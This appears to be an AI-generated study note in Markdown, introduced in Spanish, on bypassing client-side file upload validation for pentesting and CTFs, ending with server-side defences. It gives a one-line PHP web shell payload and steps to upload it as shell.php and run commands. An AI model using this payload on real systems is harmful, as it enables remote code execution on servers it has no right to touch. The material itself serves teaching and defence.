Aquí tienes el contenido de **Bypassing Client-Side Validation** unificado en un solo bloque de texto plano (Markdown), manteniendo el estilo técnico y directo para tu colección:

```markdown
# File Upload Attacks - Bypassing Client-Side Validation

## 🧠 Client-Side Validation
This protection is inherently weak because it occurs in the user's browser, which the user fully controls. If validation is handled via JavaScript or HTML attributes, it can be bypassed easily.

---

## 🔍 How it Works
The browser checks the file before sending it to the server.
**Typical Example:**
```html
<input type="file" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```
**In JavaScript:**
```javascript
if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
    alert("Only images are allowed!");
}
```
👉 This code executes locally. The server blindly trusts the client, which is a critical security flaw.

---

## 🚀 Bypass Techniques

### 1. 🧪 Intercept and Modify (The Burp Suite Method)
The most reliable method in professional pentesting.
1. **Intercept the Request:** Capture the upload with Burp Suite.
2. **Modify the Body:**
   - Find: `filename="image.png"` ➡️ Change to: `filename="shell.php"`
   - Find: `Content-Type: image/png` ➡️ Keep or change depending on server-side checks.
   - Replace content with: `<?php system($_GET['cmd']); ?>`
3. **Forward:** If the backend doesn't re-validate, the file is uploaded.
4. **Execution:** Access `http://SERVER/uploads/shell.php?cmd=id` ➡️ **RCE achieved**.

### 2. 🛠️ Frontend Manipulation (DevTools)
Quick method for CTFs or simple environments.
1. **Inspect Element:** (CTRL + SHIFT + C) on the upload button.
2. **Remove Validation:** 
   - Delete `onchange="checkFile(this)"`
   - Delete `accept=".jpg,.jpeg,.png"`
3. **Upload:** Now the browser will let you select and send `.php` files directly.

---

## 🔥 Method Comparison
| Method | Reliability | Realism |
| :--- | :--- | :--- |
| **Burp / Request** | 100% Reliable | 🔥 High |
| **DevTools** | Fast / Hits limitations | Medium |

---

## ⚠️ Indicators of Vulnerability
- Instant "Only images allowed" alerts (no network lag).
- Validation code visible in the page source.
- Upload works perfectly after modifying the raw request.

---

## 🛡️ Proper Defense (Server-Side)
A secure backend must:
- ✔️ Validate the **real** extension on the server.
- ✔️ Validate MIME-Type.
- ✔️ Check **Magic Bytes** (file signatures).
- ✔️ Rename uploaded files to random strings.
- ✔️ Store files outside the webroot or in a non-executable directory.

---

## 💣 Key Summary
Client-side validation = UX (User Experience), **NOT** Security.
1. Bypass via request modification.
2. Upload web shell.
3. Remote Code Execution (RCE).
```
